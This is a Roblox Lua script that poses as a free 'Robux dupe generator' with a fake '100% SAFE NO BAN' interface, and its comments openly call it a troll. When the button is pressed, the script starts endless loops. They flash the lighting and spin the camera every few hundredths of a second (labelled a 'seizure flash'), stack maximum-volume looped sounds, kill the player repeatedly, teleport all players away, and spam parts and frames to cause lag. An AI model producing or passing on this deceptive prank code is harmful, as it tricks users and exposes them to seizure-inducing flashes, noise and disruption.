-- DUPE ROBUX 999999 GENERATOR 2026 (ACTUAL WORST THING EVER) 😭💀🔥💔
local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Parent = game.CoreGui
gui.Name = "FreeRobuxDupe2026"

local main = Instance.new("Frame")
main.Size = UDim2.new(0,320,0,420)
main.Position = UDim2.new(0.5,-160,0.5,-210)
main.BackgroundColor3 = Color3.fromRGB(20,20,20)
main.BorderSizePixel = 0
main.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,60)
title.BackgroundColor3 = Color3.fromRGB(255,0,0)
title.Text = "ROBUX DUPE 2026\nGET INFINITE RBX!\n epileptic people get out pls"
title.TextColor3 = Color3.fromRGB(255,255,0)
title.Font = Enum.Font.Cartoon
title.TextSize = 35
title.TextStrokeTransparency = 0
title.TextStrokeColor3 = Color3.fromRGB(0,0,0)
title.Parent = main

local fakeLoading = Instance.new("TextLabel")
fakeLoading.Size = UDim2.new(0.9,0,0,80)
fakeLoading.Position = UDim2.new(0.05,0,0.2,0)
fakeLoading.BackgroundTransparency = 1
fakeLoading.Text = "Connecting to Roblox servers...\nVerifying account...\nDuplicating Robux..."
fakeLoading.TextColor3 = Color3.fromRGB(0,255,0)
fakeLoading.Font = Enum.Font.Arcade
fakeLoading.TextSize = 24
fakeLoading.TextWrapped = true
fakeLoading.Parent = main

local dupeBtn = Instance.new("TextButton")
dupeBtn.Size = UDim2.new(0.8,0,0,100)
dupeBtn.Position = UDim2.new(0.1,0,0.45,0)
dupeBtn.BackgroundColor3 = Color3.fromRGB(0,255,0)
dupeBtn.BorderSizePixel = 4
dupeBtn.BorderColor3 = Color3.fromRGB(255,215,0)
dupeBtn.Text = "DUPE 1,000,000 ROBUX NOW!\n100% SAFE NO BAN"
dupeBtn.TextColor3 = Color3.fromRGB(255,0,0)
dupeBtn.Font = Enum.Font.Cartoon
dupeBtn.TextSize = 32
dupeBtn.TextWrapped = true
dupeBtn.Parent = main

local bottom = Instance.new("TextLabel")
bottom.Size = UDim2.new(1,0,0,60)
bottom.Position = UDim2.new(0,0,1,-60)
bottom.BackgroundColor3 = Color3.fromRGB(0,0,255)
bottom.Text = "VERIFIED • HAPPYMOD APPROVED • NO VIRUS LOL"
bottom.TextColor3 = Color3.fromRGB(255,255,0)
bottom.Font = Enum.Font.Arcade
bottom.TextSize = 26
bottom.Parent = main

-- the actual cancer starts when u press
dupeBtn.MouseButton1Click:Connect(function()
    fakeLoading.Text = "DUPE SUCCESS! +1,000,000 ROBUX ADDED!\nEnjoy your free Robux! 😈"
    
    -- spawn 50 fake loading bars that do nothing but lag
    for i=1,50 do
        local bar = Instance.new("Frame")
        bar.Size = UDim2.new(0.9,0,0,20)
        bar.Position = UDim2.new(0.05,0,0.1 + i*0.03,0)
        bar.BackgroundColor3 = Color3.fromRGB(0,255,0)
        bar.Parent = main
        spawn(function()
            while true do
                bar.BackgroundColor3 = Color3.fromHSV(tick()%1,1,1)
                wait(0.05)
            end
        end)
    end
    
    -- infinite earrape 67 phonk stack (10 instances)
    for i=1,10 do
        spawn(function()
            local s = Instance.new("Sound")
            s.SoundId = "rbxassetid://125476440612900"
            s.Volume = 10
            s.PlaybackSpeed = math.random(5,20)/10
            s.Looped = true
            s.Parent = player.PlayerGui
            s:Play()
        end)
    end
    
    -- screen seizure flash + random rotation
    spawn(function()
        while true do
            game.Lighting.Brightness = math.random(0,100)
            game.Lighting.ClockTime = math.random(0,24)
            workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
            wait(0.03)
        end
    end)
    
    -- kill loop + teleport everyone
    spawn(function()
        while true do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Health = 0
            end
            for _, p in pairs(game.Players:GetPlayers()) do
                if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                    p.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-100000,100000), 999999, math.random(-100000,100000))
                end
            end
            wait(0.2)
        end
    end)
    
    -- spam random parts everywhere
    spawn(function()
        while true do
            local part = Instance.new("Part")
            part.Size = Vector3.new(math.random(1,50),math.random(1,50),math.random(1,50))
            part.Position = Vector3.new(math.random(-5000,5000), math.random(1000,5000), math.random(-5000,5000))
            part.Color = Color3.new(math.random(),math.random(),math.random())
            part.Transparency = math.random()
            part.Anchored = false
            part.Parent = workspace
            wait(0.05)
        end
    end)
    
    dupeBtn.Text = "DUPE COMPLETE! CLOSE TO STOP (YOU WONT)"
    dupeBtn.BackgroundColor3 = Color3.fromRGB(255,0,0)
end)

print("worst dupe robux gui ever made u asked for it 😭💔")
print("press the big green button and cry fatty")
